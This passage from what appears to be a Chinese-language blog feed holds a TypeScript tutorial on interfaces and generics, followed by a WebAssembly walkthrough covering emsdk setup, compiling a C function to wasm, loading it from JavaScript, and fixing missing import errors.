<h4 id="接口的定义"><a href="#接口的定义" class="headerlink" title="接口的定义"></a>接口的定义</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">interface FullName&#123;</span><br><span class="line">    firstname:string;</span><br><span class="line">    lastName:string;</span><br><span class="line">    secoundName?:string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNames</span>(<span class="params">name:FullName</span>):<span class="title">void</span></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(name);</span><br><span class="line">&#125;</span><br><span class="line">getNames(&#123;</span><br><span class="line">    firstname: <span class="string">&#x27;李&#x27;</span>,</span><br><span class="line">    lastName: <span class="string">&#x27;四&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">getNames(&#123;</span><br><span class="line">    firstname: <span class="string">&#x27;李&#x27;</span>,</span><br><span class="line">    lastName: <span class="string">&#x27;四&#x27;</span>,</span><br><span class="line">    secoundName: <span class="string">&#x27;外号-人称刀疤李四&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="案例-ajax-接口封装"><a href="#案例-ajax-接口封装" class="headerlink" title="案例 ajax 接口封装"></a>案例 ajax 接口封装</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">interface Config&#123;</span><br><span class="line">    method: string;</span><br><span class="line">    url:string;</span><br><span class="line">    data?:string;</span><br><span class="line">    dataType:string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">config:Config</span>):<span class="title">any</span></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(config.method,config.url, <span class="literal">true</span>);</span><br><span class="line">    xhr.send(config.data);</span><br><span class="line">    xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span></span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">config.dataType == <span class="string">&#x27;json&#x27;</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> xhr.responseText;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax(&#123;</span><br><span class="line">    method: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    url: <span class="string">&#x27;https://blog.youngzk.com&#x27;</span>,</span><br><span class="line">    dataType:<span class="string">&#x27;text&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="函数类型接口"><a href="#函数类型接口" class="headerlink" title="函数类型接口"></a>函数类型接口</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">interface Maths &#123;</span><br><span class="line">    (a:number,<span class="attr">b</span>:number):number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sums:Maths = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="keyword">as</span>:number,bs:number</span>):<span class="title">number</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">as</span>+bs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sums(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="可索引接口"><a href="#可索引接口" class="headerlink" title="可索引接口"></a>可索引接口</h5><blockquote>
<p>数组 对象的约束</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">interface Arr &#123;</span><br><span class="line">    [index:number]:string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> array:Arr[]=[<span class="string">&#x27;111&#x27;</span>,<span class="string">&#x27;222&#x27;</span>];</span><br><span class="line"></span><br><span class="line">interface Obj &#123;</span><br><span class="line">    [index:string]:string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> array1:Obj=&#123;</span><br><span class="line">    name:<span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="comment">// age: 12   错误 ，只能是字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="类的类型接口"><a href="#类的类型接口" class="headerlink" title="类的类型接口"></a>类的类型接口</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">interface Tiger &#123;</span><br><span class="line">    name:string</span><br><span class="line">    eat(food:string):<span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmallTiger</span> <span class="title">implements</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    name: string;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    eat(food:string):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>吃<span class="subst">$&#123;food&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> smallTiger:Tiger = <span class="keyword">new</span> SmallTiger(<span class="string">&#x27;小脑虎&#x27;</span>);</span><br><span class="line">smallTiger.eat(<span class="string">&#x27;肉&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="接口的继承"><a href="#接口的继承" class="headerlink" title="接口的继承"></a>接口的继承</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">interface Fruits&#123;</span><br><span class="line">    has():<span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Appale <span class="keyword">extends</span> Fruits&#123;</span><br><span class="line">    getColor():string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedApp</span> <span class="title">implements</span> <span class="title">Appale</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    has():<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;红苹果是水果&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getColor():string&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;红苹果是红色的&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> redApp:RedApp = <span class="keyword">new</span> RedApp();</span><br><span class="line">redApp.has();</span><br><span class="line"><span class="built_in">console</span>.log(redApp.getColor());</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="泛型的定义"><a href="#泛型的定义" class="headerlink" title="泛型的定义"></a>泛型的定义</h4><blockquote>
<p>泛型<br>功能，提高复用性以及对不确定的数据类型</p>
</blockquote>
<h5 id="泛型函数"><a href="#泛型函数" class="headerlink" title="泛型函数"></a>泛型函数</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>&lt;<span class="title">T</span>&gt;(<span class="params">value:T</span>):<span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getData&lt;string&gt;(<span class="string">&#x27;wwww&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(getData&lt;number&gt;(<span class="number">12433</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinClass</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    list:T[]=[];</span><br><span class="line">    add(num:T):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.list.push(num);</span><br><span class="line">    &#125;</span><br><span class="line">    toString():string&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.list.join();</span><br><span class="line">    &#125;</span><br><span class="line">    getFirstChild():T&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.list[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> min:MinClass&lt;number&gt; = <span class="keyword">new</span> MinClass&lt;number&gt;();</span><br><span class="line">min.add(<span class="number">1</span>);</span><br><span class="line">min.add(<span class="number">5</span>);</span><br><span class="line">min.add(<span class="number">1</span>);</span><br><span class="line">min.add(-<span class="number">3</span>);</span><br><span class="line">min.add(<span class="number">9</span>);</span><br><span class="line">min.add(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(min.getFirstChild());</span><br><span class="line"><span class="built_in">console</span>.log(min.toString());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> min1:MinClass&lt;string&gt; = <span class="keyword">new</span> MinClass&lt;string&gt;();</span><br><span class="line">min1.add(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">min1.add(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">min1.add(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">min1.add(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(min1.getFirstChild());</span><br><span class="line"><span class="built_in">console</span>.log(min1.toString());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="泛型函数接口"><a href="#泛型函数接口" class="headerlink" title="泛型函数接口"></a>泛型函数接口</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">interface ConfigFnc &#123;</span><br><span class="line">    &lt;T&gt;(value:T):T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getAges:ConfigFnc = <span class="function"><span class="keyword">function</span>&lt;<span class="title">T</span>&gt;(<span class="params">value:T</span>):<span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getAges(<span class="number">1</span>));</span><br><span class="line"><span class="built_in">console</span>.log(getAges(<span class="string">&#x27;asd&#x27;</span>));</span><br><span class="line"></span><br><span class="line">interface ConfigFnc1&lt;T&gt; &#123;</span><br><span class="line">    (value:T):T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getAges1:ConfigFnc1&lt;number&gt; = <span class="function"><span class="keyword">function</span>&lt;<span class="title">T</span>&gt;(<span class="params">value:T</span>):<span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getAges1(<span class="number">1</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>webAssembly</title>
    <url>/posts/7f98c2be/</url>
    <content><![CDATA[<h2 id="What-WebAssembly"><a href="#What-WebAssembly" class="headerlink" title="What WebAssembly ?"></a>What WebAssembly ?</h2><ul>
<li><p>WebAssembly简称WASM，是一种以安全有效的方式运行便携式程序的新技术，主要针对Web平台。与ASM.js类似，WASM的目标是低级别的抽象，适合作为更高级别程序的中间表示 - 即WebAssembly代码旨在由编译器生成而不是由人类编写。在W3C社区组包括来自最大的网络浏览器的公司，包括谷歌，微软，苹果和Mozilla做这件事，而令人兴奋的代表。</p>
</li>
<li><p>WebAssembly是一种新的适合于编译到Web的，可移植的，大小和加载时间高效的格式，是一种新的字节码格式。它的缩写是”.wasm”，.wasm 为文件名后缀，是一种新的底层安全的“二进制”语法。它被定义为“精简、加载时间短的格式和执行模型”，并且被设计为Web 多编程语言目标文件格式。<br>这意味着浏览器端的性能会得到极大提升，它也使得我们能够实现一个底层构建模块的集合.</p>
</li>
</ul>
<a id="more"></a>

<h2 id="webAssembly的优势"><a href="#webAssembly的优势" class="headerlink" title="webAssembly的优势"></a>webAssembly的优势</h2><p>webassembly相较于asm.js的优势主要是涉及到性能方面。根据WebAssembly FAQ的描述：在移动设备上，对于很大的代码库，asm.js仅仅解析就需要花费20-40秒，而实验显示WebAssembly的加载速度比asm.js快了20倍，这主要是因为相比解析 asm.js 代码，JavaScript 引擎破译二进制格式的速度要快得多。</p>
<p>主流的浏览器目前均支持webAssembly。</p>
<ul>
<li>Safari 支持 WebAssembly的第一个版本是 11</li>
<li>Edge 支持 WebAssembly的第一个版本是 16</li>
<li>Firefox 支持 WebAssembly的第一个版本是 52</li>
<li>chrome 支持 WebAssembly的第一个版本是 57</li>
</ul>
<p>使用WebAssembly，我们可以在浏览器中运行一些高性能、低级别的编程语言，可用它将大型的C和C++代码库比如游戏、物理引擎甚至是桌面应用程序导入Web平台。</p>
<h2 id="开发前准备工作"><a href="#开发前准备工作" class="headerlink" title="开发前准备工作"></a>开发前准备工作</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><blockquote>
<p>MAC系统</p>
</blockquote>
<h3 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h3><blockquote>
<p>git 、node 、python 、cmake、emsdk</p>
</blockquote>
<h4 id="git"><a href="#git" class="headerlink" title="git"></a>git</h4><p>已经默认装</p>
<h4 id="node"><a href="#node" class="headerlink" title="node"></a>node</h4><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><p>官网：<a href="https://www.python.org/">https://www.python.org</a><br>下载地址：<a href="https://www.python.org/ftp/python/3.7.0/python-3.7.0-macosx10.9.pkg">https://www.python.org/ftp/python/3.7.0/python-3.7.0-macosx10.9.pkg</a></p>
<h4 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h4><p> 官网：<a href="http://www.cmake.org/">http://www.cmake.org</a><br> 下载地址：<a href="https://cmake.org/files/v3.12/cmake-3.12.1-Darwin-x86_64.dmg">https://cmake.org/files/v3.12/cmake-3.12.1-Darwin-x86_64.dmg</a></p>
<p> 为了可以在命令行中使用，需要执行一下命令。<br> sudo “/Applications/CMake.app/Contents/bin/cmake-gui” –install</p>
<h4 id="emsdk"><a href="#emsdk" class="headerlink" title="emsdk"></a>emsdk</h4><p>Emscripten 的底层是 LLVM 编译器，理论上任何可以生成 LLVM IR（Intermediate Representation）的语言，都可以编译生成 asm.js。 但是实际上，Emscripten 几乎只用于将 C / C++ 代码编译生成 asm.js。</p>
<blockquote>
<p>** C/C++ ** ⇒ ** LLVM ** ==&gt; ** LLVM IR ** ⇒ ** Emscripten ** ⇒ ** asm.js **</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/juj/emsdk.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> emsdk</span><br><span class="line"></span><br><span class="line">./emsdk update</span><br><span class="line">./emsdk install latest</span><br><span class="line">./emsdk activate latest</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ./emsdk_env.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="浏览器支持"><a href="#浏览器支持" class="headerlink" title="浏览器支持"></a>浏览器支持</h3><blockquote>
<p>Chrome: 打开 chrome://flags/#enable-webassembly，选择 enable。<br>Firefox: 打开 about:config 将 javascript.options.wasm 设置为 true。</p>
</blockquote>
<h2 id="开始编程"><a href="#开始编程" class="headerlink" title="开始编程"></a>开始编程</h2><h3 id="编写C代码"><a href="#编写C代码" class="headerlink" title="编写C代码"></a>编写C代码</h3><p>创建** example.c ** 文件，并写入如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">add</span><span class="params">(<span class="keyword">float</span> a,<span class="keyword">float</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="编译出wasm"><a href="#编译出wasm" class="headerlink" title="编译出wasm"></a>编译出wasm</h3><p>** bash 执行命令： **</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">emcc -s EXPORTED_FUNCTIONS=<span class="string">&quot;[&#x27;_add]&quot;</span> example.c -s WASM=1 -s SIDE_MODULE=1 -s BINARYEN_ASYNC_COMPILATION=0 -o example.wasm </span><br></pre></td></tr></table></figure>

<h3 id="调用wasm"><a href="#调用wasm" class="headerlink" title="调用wasm"></a>调用wasm</h3><blockquote>
<p>js调用wasm中导出的module</p>
</blockquote>
<p>** loader模块编写 **</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadWebAssembly</span>(<span class="params">path, imports = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> fetch(path)</span><br><span class="line">    .then(<span class="function"><span class="params">response</span> =&gt;</span> response.arrayBuffer())</span><br><span class="line">    .then(<span class="function"><span class="params">buffer</span> =&gt;</span> WebAssembly.compile(buffer))</span><br><span class="line">    .then(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">//针对wasm所需的import处理，importObject</span></span><br><span class="line">      imports.env = imports.env || &#123;&#125;</span><br><span class="line">      imports.env = imports.env || &#123;&#125;</span><br><span class="line">      imports.env.DYNAMICTOP_PTR = imports.env.DYNAMICTOP_PTR || <span class="number">0</span>;</span><br><span class="line">      imports.env.tempDoublePtr = imports.env.tempDoublePtr || <span class="number">0</span>;</span><br><span class="line">      imports.env.ABORT = imports.env.ABORT || <span class="number">0</span>;</span><br><span class="line">      imports.global = imports.global || &#123; <span class="attr">NaN</span>: <span class="number">1</span>, <span class="attr">Infinity</span>: <span class="number">2</span> &#125;;</span><br><span class="line">      imports.env.abortStackOverflow = imports.env.abortStackOverflow || <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br><span class="line">      imports.env.nullFunc_X = imports.env.nullFunc_X || <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br><span class="line">      <span class="comment">// 开辟内存空间</span></span><br><span class="line">      imports.env.memoryBase = imports.env.memoryBase || <span class="number">0</span></span><br><span class="line">      <span class="keyword">if</span> (!imports.env.memory) &#123;</span><br><span class="line">        imports.env.memory = <span class="keyword">new</span> WebAssembly.Memory(&#123; <span class="attr">initial</span>: <span class="number">256</span> &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 创建变量映射表</span></span><br><span class="line">      imports.env.tableBase = imports.env.tableBase || <span class="number">0</span></span><br><span class="line">      <span class="keyword">if</span> (!imports.env.table) &#123;</span><br><span class="line">        imports.env.table = <span class="keyword">new</span> WebAssembly.Table(&#123; <span class="attr">initial</span>: <span class="number">2</span>, <span class="attr">element</span>: <span class="string">&#x27;anyfunc&#x27;</span> &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 创建 WebAssembly 实例</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> WebAssembly.instantiate(<span class="built_in">module</span>, imports)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="html片段"><a href="#html片段" class="headerlink" title="html片段"></a>html片段</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;mybutton&quot;</span>&gt;</span>取随机数<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> wasm = loadWebAssembly(<span class="string">&#x27;example.wasm&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> myButton = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;mybutton&#x27;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> x = <span class="number">1.22</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> y = <span class="number">2.11</span>;</span></span><br><span class="line"><span class="javascript">        myButton.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            wasm.then(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;wasm-计算：&#x27;</span> + <span class="built_in">module</span>.exports._add(x, y));</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;js-计算：&#x27;</span> + (x + y));</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="WebAssembly组成部分"><a href="#WebAssembly组成部分" class="headerlink" title="WebAssembly组成部分"></a>WebAssembly组成部分</h2><blockquote>
<p>实际上** WebAssembly **被称为 “模块”，因为使用WebAssembly，”程序”和”库”之间没有区别 - 只有”模块”，每个模块都可以与其他模块绑定和通信，每个模块都可以具有”模块”主功能。</p>
</blockquote>
<h3 id="必选部分"><a href="#必选部分" class="headerlink" title="必选部分"></a>必选部分</h3><ul>
<li>Type：在模块中定义的函数的函数声明和所有引入函数的函数声明。</li>
<li>Function：给出模块中每个函数一个索引。</li>
<li>Code：模块中每个函数的实际函数体。</li>
</ul>
<h3 id="可选部分"><a href="#可选部分" class="headerlink" title="可选部分"></a>可选部分</h3><ul>
<li>Export：使函数、内存、表（tables）、全局变量等对其他 WebAssembly 或 JavaScript 可见，允许动态链接一些分开编译的组件，即 .dll 的WebAssembly 版本。</li>
<li>Import：允许从其他 WebAssembly 或者 JavaScript 中导入指定的函数、内存、表或者全局变量。</li>
<li>Start：当 WebAssembly 模块加载进来的时候，可以自动运行的函数（类似于 main 函数）。</li>
<li>Global：声明模块的全局变量。</li>
<li>Memory：定义模块用到的内存。</li>
<li>Table：使得可以映射到 WebAssembly 模块以外的值，如映射到 JavaScript 的对象。这在间接函数调用时很有用。</li>
<li>Data：初始化导入的或者局部内存。</li>
<li>Element：初始化导入的或者局部的表。</li>
</ul>
<h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><h3 id="无法导入环境变量"><a href="#无法导入环境变量" class="headerlink" title="无法导入环境变量"></a>无法导入环境变量</h3><blockquote>
<p>在执行 source ./emsdk_env.sh 命令时失败，无法添加环境变量</p>
</blockquote>
<p>思路：脚本实现不了，就不要使用提供的脚本命令，手动添加也可以。最终是要在任何窗口中都能执行命令。<br>手动添加环境变量，一般都是添加在当前用户区，和windows理念一样。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PATH=<span class="string">&quot;/Library/Frameworks/Python.framework/Versions/3.7/bin:<span class="variable">$&#123;PATH&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=/Users/liuzhipan/emsdk:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/Users/liuzhipan/emsdk/clang/e1.38.8_64bit:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/Users/liuzhipan/emsdk/node/8.9.1_64bit/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/Users/liuzhipan/emsdk/emscripten/1.38.8:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">alias</span> python=<span class="string">&#x27;/Library/Frameworks/Python.framework/Versions/3.7/bin/python3.7&#x27;</span></span><br><span class="line"><span class="built_in">export</span> EMSDK=/Users/liuzhipan/emsdk</span><br><span class="line"><span class="built_in">export</span> EM_CONFIG=/Users/liuzhipan/.emscripten</span><br><span class="line"><span class="built_in">export</span> BINARYEN_ROOT=/Users/liuzhipan/emsdk/clang/e1.38.8_64bit/binaryen</span><br><span class="line"><span class="built_in">export</span> EMSCRIPTEN=/Users/liuzhipan/emsdk/emscripten/1.38.8</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$EMSDK</span>:<span class="variable">$EM_CONFIG</span>:<span class="variable">$BINARYEN_ROOT</span>:<span class="variable">$EMSCRIPTEN</span></span><br></pre></td></tr></table></figure>

<p>仿照这份环境变量修改对应目录-路径即可。</p>
<blockquote>
<p>vim ~/.bash_profile         //添加上述的环境变量<br>source ~/.bash_profile   // 刷新当前用户环境变量缓冲，使其生效</p>
</blockquote>
<h3 id="实例化module失败"><a href="#实例化module失败" class="headerlink" title="实例化module失败"></a>实例化module失败</h3><blockquote>
<p>构建出来包之后，发现importObject提供的资源缺少导致实例化module失败。</p>
</blockquote>
<p>思路：官网提供的大部分都是env对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开辟内存空间</span></span><br><span class="line">imports.env.memoryBase = imports.env.memoryBase || <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> (!imports.env.memory) &#123;</span><br><span class="line">    imports.env.memory = <span class="keyword">new</span> WebAssembly.Memory(&#123; <span class="attr">initial</span>: <span class="number">256</span> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建变量映射表</span></span><br><span class="line">imports.env.tableBase = imports.env.tableBase || <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> (!imports.env.table) &#123;</span><br><span class="line">    imports.env.table = <span class="keyword">new</span> WebAssembly.Table(&#123; <span class="attr">initial</span>: <span class="number">2</span>, <span class="attr">element</span>: <span class="string">&#x27;anyfunc&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>** 问题关键 **</p>
<p>可是我导出来的wasm-module不止这几个。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;memory&quot;</span> (memory <span class="variable">$env</span>.memory 256))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;table&quot;</span> (table <span class="variable">$env</span>.table 2 anyfunc))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;memoryBase&quot;</span> (global <span class="variable">$env</span>.memoryBase i32))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;tableBase&quot;</span> (global <span class="variable">$env</span>.tableBase i32))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;DYNAMICTOP_PTR&quot;</span> (global <span class="variable">$env</span>.DYNAMICTOP_PTR i32))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;tempDoublePtr&quot;</span> (global <span class="variable">$env</span>.tempDoublePtr i32))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;ABORT&quot;</span> (global <span class="variable">$env</span>.ABORT i32))</span><br><span class="line">(import <span class="string">&quot;global&quot;</span> <span class="string">&quot;NaN&quot;</span> (global <span class="variable">$global</span>.NaN f64))</span><br><span class="line">(import <span class="string">&quot;global&quot;</span> <span class="string">&quot;Infinity&quot;</span> (global <span class="variable">$global</span>.Infinity f64))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;abortStackOverflow&quot;</span> (func <span class="variable">$env</span>.abortStackOverflow (<span class="built_in">type</span> <span class="variable">$t0</span>)))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;nullFunc_X&quot;</span> (func <span class="variable">$env</span>.nullFunc_X (<span class="built_in">type</span> <span class="variable">$t0</span>)))</span><br><span class="line">(func <span class="variable">$f2</span> (<span class="built_in">type</span> <span class="variable">$t1</span>) (param <span class="variable">$p0</span> i32) (result i32)</span><br></pre></td></tr></table></figure>

<p>** 处理方案： **</p>
<ul>
<li>所以要对多导出来的资源进行处理。<br>这些都是实例化module需要提供的import.加入对应的字段即可处理！</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">imports.env.DYNAMICTOP_PTR = imports.env.DYNAMICTOP_PTR || <span class="number">0</span>;</span><br><span class="line">imports.env.tempDoublePtr = imports.env.tempDoublePtr || <span class="number">0</span>;</span><br><span class="line">imports.env.ABORT = imports.env.ABORT || <span class="number">0</span>;</span><br><span class="line">imports.global = imports.global || &#123; <span class="attr">NaN</span>: <span class="number">1</span>, <span class="attr">Infinity</span>: <span class="number">2</span> &#125;;</span><br><span class="line">imports.env.abortStackOverflow = imports.env.abortStackOverflow || <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br><span class="line">imports.env.nullFunc_X = imports.env.nullFunc_X || <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br></pre></td></tr></table></figure>
<ul>
